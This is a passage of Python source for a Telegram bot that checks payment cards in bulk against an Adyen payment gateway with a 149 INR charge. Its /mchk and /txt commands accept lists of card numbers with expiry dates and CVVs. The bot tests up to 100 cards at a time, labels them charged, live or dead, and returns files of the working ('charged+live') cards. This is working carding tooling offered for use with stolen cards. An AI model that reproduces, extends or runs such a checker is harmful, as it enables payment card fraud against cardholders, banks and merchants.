    time_str = f" • ⏱️ <code>{elapsed_sec:.1f}s</code>" if elapsed_sec > 0 else ""

    stats_line = (
        f"💳 <b>Charged:</b> <code>{stats['charged']}</code> | "
        f"⚡ <b>Live:</b> <code>{stats['insuff'] + stats['live_3d']}</code> | "
        f"❌ <b>Dead:</b> <code>{stats['dead']}</code>"
    )
    if stats.get("error", 0) > 0:
        stats_line += f" | 💥 <b>Error:</b> <code>{stats['error']}</code>"

    lines = [
        header + time_str,
        f"🌐 <b>Gateway:</b> <code>Adyen 149 INR</code>",
        stats_line,
        "──────────────────────────",
    ]

    for item in card_entries:
        idx = item["idx"]
        card = item["card"]
        state = item.get("state", "pending")
        card_str = f"{card[0]}|{card[1]}|{card[2]}|{card[3]}"

        if state == "pending":
            lines.append(f"<b>#{idx}</b> <code>{card_str}</code>\n↳ ⏳ <i>Queued…</i>\n")
        elif state == "checking":
            lines.append(f"<b>#{idx}</b> <code>{card_str}</code>\n↳ 🔄 <i>Checking…</i>\n")
        else:
            r = item.get("res", {})
            stype = r.get("status_type", "declined")
            code  = str(r.get("code", ""))
            
            lbl = r.get("label", "")
            if not lbl:
                if stype == "approved": lbl = "✅ APPROVED"
                elif code == "3.02": lbl = "⚡ LIVE [INSUFFICIENT FUNDS]"
                elif stype in ("live", "3ds"): lbl = "⚡ LIVE [3DS]"
                elif stype == "error": lbl = "💥 ERROR"
                else: lbl = "❌ DECLINED"

            resp_detail = f"({code})" if (code and f"({code})" not in lbl and code not in lbl) else ""
            resp_str = f" {resp_detail}" if resp_detail else ""
            
            bdata = BIN_DB.get(card[0][:6], {})
            bi = r.get("bin", {})
            bank = bdata.get("issuer") or bi.get("bank", "")
            iso2 = bdata.get("iso2") or bi.get("country", "")
            cflag = _flag_from_iso2(iso2) if iso2 else ""

            info_sub = []
            if bank:
                info_sub.append(bank[:16])
            if iso2:
                info_sub.append(f"{cflag} {iso2}".strip())
            info_str = f" • <i>{' - '.join(info_sub)}</i>" if info_sub else ""

            lines.append(f"<b>#{idx}</b> <code>{card_str}</code>\n↳ <b>{lbl}</b>{resp_str}{info_str}\n")

    lines.append("──────────────────────────")
    return "\n".join(lines)

@router.message(Command("mchk"))
async def cmd_mchk(msg: Message):
    if not await check_access(msg):
        return

    uid = msg.from_user.id
    if is_user_checking(uid) and uid != ADMIN_ID:
        await msg.answer(
            "⏳ <b>You already have a check in progress!</b>\n"
            "Please wait for it to finish or send /cancel.",
            parse_mode="HTML"
        )
        return

    raw_text = msg.text or ""
    # If replying to another message with /mchk
    if msg.reply_to_message and len(raw_text.split()) <= 1:
        raw_text = msg.reply_to_message.text or msg.reply_to_message.caption or ""

    lines = []
    for l in raw_text.splitlines():
        l_clean = l.strip()
        if not l_clean:
            continue
        if l_clean.startswith("/mchk"):
            parts = l_clean.split(maxsplit=1)
            if len(parts) > 1 and parts[1].strip():
                lines.append(parts[1].strip())
        else:
            lines.append(l_clean)

    if not lines:
        await msg.answer(
            "Usage:\n<code>/mchk\nnumber|mm|yy|cvv\nnumber|mm|yy|cvv</code>\n(or reply to card list with /mchk)",
            parse_mode="HTML"
        )
        return

    cards, bad = [], []
    for l in lines[:10]:
        p = parse_card(l)
        if p: cards.append(p)
        else: bad.append(l[:30])

    if bad:
        await msg.answer("⚠️ Skipped: " + " | ".join(f"<code>{b}</code>" for b in bad), parse_mode="HTML")
    if not cards:
        await msg.answer("No valid cards."); return

    t0 = time.time()
    stats = {"charged": 0, "insuff": 0, "live_3d": 0, "dead": 0, "error": 0}
    card_entries = [
        {"idx": i, "card": c, "state": "pending", "res": {}}
        for i, c in enumerate(cards, 1)
    ]

    queue = asyncio.Queue()
    for item in card_entries:
        queue.put_nowait(item)

    acquire_user_check(uid, queue=queue)

    prog = await msg.answer(
        format_mchk_message(card_entries, len(cards), stats),
        reply_markup=get_cancel_kb(uid),
        parse_mode="HTML"
    )

    loop = asyncio.get_event_loop()
    last_update_time = 0.0

    async def update_display(force=False, is_done=False):
        nonlocal last_update_time
        now = time.time()
        if force or (now - last_update_time >= 1.2):
            last_update_time = now
            elapsed = now - t0
            cancelled = is_user_cancelled(uid)
            kb = None if (is_done or cancelled) else get_cancel_kb(uid)
            try:
                await prog.edit_text(
                    format_mchk_message(
                        card_entries, len(cards), stats,
                        is_cancelled=cancelled, is_done=is_done, elapsed_sec=elapsed
                    ),
                    reply_markup=kb,
                    parse_mode="HTML"
                )
            except Exception:
                pass

    async def worker():
        while not queue.empty():
            if is_user_cancelled(uid):
                break
            try:
                item = queue.get_nowait()
            except asyncio.QueueEmpty:
                break

            if is_user_cancelled(uid):
                queue.task_done()
                break

            item["state"] = "checking"
            await update_display()

            r = await loop.run_in_executor(_pool, lambda cc=item["card"]: run_check(*cc, user_id=uid))

            if is_user_cancelled(uid) or r.get("status_type") == "cancelled":
                item["state"] = "pending"
                queue.task_done()
                break

            item["state"] = "done"
            item["res"] = r

            stype = r.get("status_type", "declined")
            code  = str(r.get("code", ""))
            lbl   = str(r.get("label", ""))

            is_charged  = (stype == "approved" or "APPROVED" in lbl)
            is_insuff   = (code == "3.02" or "INSUFFICIENT" in lbl)
            is_live_3ds = (stype in ("3ds", "live") or "LIVE" in lbl) and not is_charged and not is_insuff

            if is_charged:
                stats["charged"] += 1
                user = msg.from_user
                asyncio.ensure_future(_push_hit(
                    msg.bot, r,
                    user_id=user.id,
                    username=user.username,
                    full_name=user.full_name,
                ))
            elif is_insuff:
                stats["insuff"] += 1
            elif is_live_3ds:
                stats["live_3d"] += 1
            elif stype == "error":
                stats["error"] += 1
            else:
                stats["dead"] += 1

            queue.task_done()
            await update_display()

    try:
        workers = [worker() for _ in range(min(3, len(cards)))]
        await asyncio.gather(*workers)
        await update_display(force=True, is_done=not is_user_cancelled(uid))
    finally:
        release_user_check(uid)

# ──────────────────────────────────────────────────────────────
# /txt — reply to a .txt file, check up to 100 cards (10 concurrent)
# ──────────────────────────────────────────────────────────────
def format_txt_stats(checked: int, total: int, stats: dict) -> str:
    return (
        f"🔄 <b>Checking File Progress:</b> <code>{checked}/{total}</code>\n\n"
        f"💳 <b>Charged:</b> <code>{stats['charged']}</code>        ⚡ <b>3DS (Live):</b> <code>{stats['live_3d']}</code>\n"
        f"⚠️ <b>Insuff:</b> <code>{stats['insuff']}</code>         ❌ <b>Dead:</b> <code>{stats['dead']}</code>\n"
        f"💥 <b>Error:</b> <code>{stats['error']}</code>"
    )

@router.message(Command("txt"))
@router.message(F.document & F.caption.startswith("/txt"))
async def cmd_txt(msg: Message):
    if not await check_access(msg):
        return

    uid = msg.from_user.id
    if is_user_checking(uid) and uid != ADMIN_ID:
        await msg.answer(
            "⏳ <b>You already have a check in progress!</b>\n"
            "Please wait for it to finish or send /cancel.",
            parse_mode="HTML"
        )
        return

    doc = None
    if msg.document:
        doc = msg.document
    elif msg.reply_to_message and msg.reply_to_message.document:
        doc = msg.reply_to_message.document

    if not doc:
        await msg.answer(
            "ℹ️ Reply to a <b>.txt file</b> with /txt, or upload a file with caption <code>/txt</code>\n"
            "File should contain one card per line: <code>number|mm|yy|cvv</code>",
            parse_mode="HTML"
        )
        return

    if doc.mime_type not in ("text/plain", None) and not (doc.file_name or "").lower().endswith(".txt"):
        await msg.answer("❌ Only .txt files are supported."); return

    if doc.file_size and doc.file_size > 10 * 1024 * 1024:
        await msg.answer("❌ File too large (max 10 MB)."); return

    prog = await msg.answer("📂 Downloading file…")
    try:
        file_obj = await msg.bot.get_file(doc.file_id)
        dl = await msg.bot.download_file(file_obj.file_path)
        raw = dl.read().decode("utf-8", errors="ignore")
    except Exception as e:
        await prog.edit_text(f"❌ Download failed: {e}")
        return

    cards = []
    for line in raw.splitlines():
        p = parse_card(line.strip())
        if p:
            cards.append(p)
        if len(cards) >= 1000:
            break

    if not cards:
        await prog.edit_text("❌ No valid cards found in file (format: <code>number|mm|yy|cvv</code>)",
                             parse_mode="HTML")
        return

    queue = asyncio.Queue()
    for idx, c in enumerate(cards, 1):
        queue.put_nowait((idx, c))

    processed_results = []
    stats = {"charged": 0, "insuff": 0, "live_3d": 0, "dead": 0, "error": 0}
    acquire_user_check(uid, queue=queue, results=processed_results, stats=stats)
    last_update_time = time.time()

    await prog.edit_text(
        format_txt_stats(0, len(cards), stats),
        reply_markup=get_txt_kb(uid, stats),
        parse_mode="HTML"
    )

    loop = asyncio.get_event_loop()

    async def worker():
        nonlocal last_update_time
        while not queue.empty():
            if is_user_cancelled(uid):
                break
            try:
                idx, card = queue.get_nowait()
            except asyncio.QueueEmpty:
                break

            if is_user_cancelled(uid):
                queue.task_done()
                break

            r = await loop.run_in_executor(_pool, lambda cc=card: run_check(*cc, user_id=uid))

            if is_user_cancelled(uid) or r.get("status_type") == "cancelled":
                queue.task_done()
                break

            processed_results.append((idx, r))

            stype = r.get("status_type", "declined")
            code  = str(r.get("code", ""))
            lbl   = str(r.get("label", ""))

            is_charged  = (stype == "approved" or "APPROVED" in lbl)
            is_insuff   = (code == "3.02" or "INSUFFICIENT" in lbl)
            is_live_3ds = (stype in ("3ds", "live") or "LIVE" in lbl) and not is_charged and not is_insuff

            if is_charged:
                stats["charged"] += 1
                # SEND INSTANT SEPARATE MESSAGE IMMEDIATELY
                try:
                    await msg.answer(fmt(r, idx=idx), parse_mode="HTML")
                except Exception:
                    pass
                user = msg.from_user
                asyncio.ensure_future(_push_hit(
                    msg.bot, r,
                    user_id=user.id,
                    username=user.username,
                    full_name=user.full_name,
                ))
            elif is_insuff:
                stats["insuff"] += 1
                # SEND INSTANT SEPARATE MESSAGE IMMEDIATELY
                try:
                    await msg.answer(fmt(r, idx=idx), parse_mode="HTML")
                except Exception:
                    pass
            elif is_live_3ds:
                stats["live_3d"] += 1
            elif stype == "error":
                stats["error"] += 1
            else:
                stats["dead"] += 1

            now = time.time()
            if now - last_update_time >= 1.5 or len(processed_results) == len(cards) or is_user_cancelled(uid):
                last_update_time = now
                try:
                    await prog.edit_text(
                        format_txt_stats(len(processed_results), len(cards), stats),
                        reply_markup=get_txt_kb(uid, stats),
                        parse_mode="HTML"
                    )
                except Exception:
                    pass

            queue.task_done()

    try:
        workers = [worker() for _ in range(min(100, len(cards)))]
        await asyncio.gather(*workers)

        status_tag = " (Cancelled)" if is_user_cancelled(uid) else " (Completed)"
        try:
            await prog.edit_text(
                f"📊 <b>Check Summary{status_tag}</b>\n\n"
                f"{format_txt_stats(len(processed_results), len(cards), stats)}",
                reply_markup=get_txt_kb(uid, stats, is_done=True),
                parse_mode="HTML"
            )
        except Exception:
            pass

        if is_user_cancelled(uid):
            await msg.answer("🛑 <b>Check was cancelled by user/admin.</b>", parse_mode="HTML")

        # Send 3 separate .txt files:
        # 1. charged+live (Charged + Insufficient Funds + 3DS Live)
        # 2. declined (Dead / Declined cards)
        # 3. error (Errors, if any)
        if processed_results:
            processed_results.sort(key=lambda x: x[0])
            USER_LAST_RESULTS[uid] = list(processed_results)

            charged_live_lines = []
            declined_lines     = []
            error_lines        = []

            for i, r in processed_results:
                c_num = r.get("card", "")
                c_exp = f"{r.get('exp_month','')}/{r.get('exp_year','')}"
                c_cvv = r.get("cvv", "")
                status_lbl = r.get("label", "")
                res_code = r.get("code", "")
                res_msg = r.get("msg", "")
                gw = f"Adyen {r.get('amount','149 INR')}"
                line_str = f"#{i} {c_num}|{c_exp}|{c_cvv} | {gw} | {status_lbl} | {res_code} {res_msg}".strip()

                stype = r.get("status_type", "declined")
                code  = str(r.get("code", ""))
                lbl   = str(r.get("label", ""))

                is_charged  = (stype == "approved" or "APPROVED" in lbl)
                is_insuff   = (code == "3.02" or "INSUFFICIENT" in lbl)
                is_live_3ds = (stype in ("3ds", "live") or "LIVE" in lbl) and not is_charged and not is_insuff

                if is_charged or is_insuff or is_live_3ds:
                    charged_live_lines.append(line_str)
                elif stype == "error":
                    error_lines.append(line_str)
                else:
                    declined_lines.append(line_str)

            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

            # 1. charged+live
            if charged_live_lines:
                cl_content = "\n".join(charged_live_lines).encode("utf-8")
                cl_filename = f"charged_live_{timestamp}.txt"
                cl_caption = (
                    f"⚡ <b>Charged + Live Cards</b> (<code>{len(charged_live_lines)}</code> cards)\n"
                    f"💳 Charged: <code>{stats['charged']}</code> | ⚠️ Insuff: <code>{stats['insuff']}</code> | ⚡ 3DS Live: <code>{stats['live_3d']}</code>"
                )
                try:
                    await msg.answer_document(
                        BufferedInputFile(cl_content, filename=cl_filename),
                        caption=cl_caption,
                        parse_mode="HTML"
                    )
                except Exception:
                    pass

            # 2. declined
            if declined_lines:
                dec_content = "\n".join(declined_lines).encode("utf-8")
                dec_filename = f"declined_{timestamp}.txt"
                dec_caption = f"❌ <b>Declined Cards</b> (<code>{len(declined_lines)}</code> cards)"
                try:
                    await msg.answer_document(
                        BufferedInputFile(dec_content, filename=dec_filename),
                        caption=dec_caption,
                        parse_mode="HTML"
                    )
                except Exception:
                    pass

            # 3. error (if any)
            if error_lines:
                err_content = "\n".join(error_lines).encode("utf-8")
                err_filename = f"error_{timestamp}.txt"
                err_caption = f"💥 <b>Error Cards</b> (<code>{len(error_lines)}</code> cards)"
                try:
                    await msg.answer_document(
                        BufferedInputFile(err_content, filename=err_filename),
                        caption=err_caption,
                        parse_mode="HTML"
                    )
                except Exception:
                    pass
    finally:
        release_user_check(uid)

# ──────────────────────────────────────────────────────────────
# MAIN & HEALTH CHECK SERVER (FOR RENDER)
# ──────────────────────────────────────────────────────────────
async def start_health_server():
    port_env = os.getenv("PORT")
    if not port_env:
        return
    try:
        from aiohttp import web
        port = int(port_env)
        async def handle_ping(request):
            return web.Response(text="Bot is running!")
        app = web.Application()
        app.router.add_get("/", handle_ping)
        app.router.add_get("/health", handle_ping)
        runner = web.AppRunner(app)
        await runner.setup()
        site = web.TCPSite(runner, "0.0.0.0", port)
        await site.start()
        log.info(f"Render health check server listening on port {port}")
    except Exception as e:
        log.warning(f"Could not start health check server: {e}")

async def main():
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("ERROR: Set BOT_TOKEN first!"); sys.exit(1)
    await start_health_server()
    bot = Bot(token=BOT_TOKEN)
    dp  = Dispatcher()
    dp.include_router(router)
    log.info("Bot polling… /chk /mchk /txt ready")
    await dp.start_polling(bot, drop_pending_updates=True)

if __name__ == "__main__":
    asyncio.run(main())

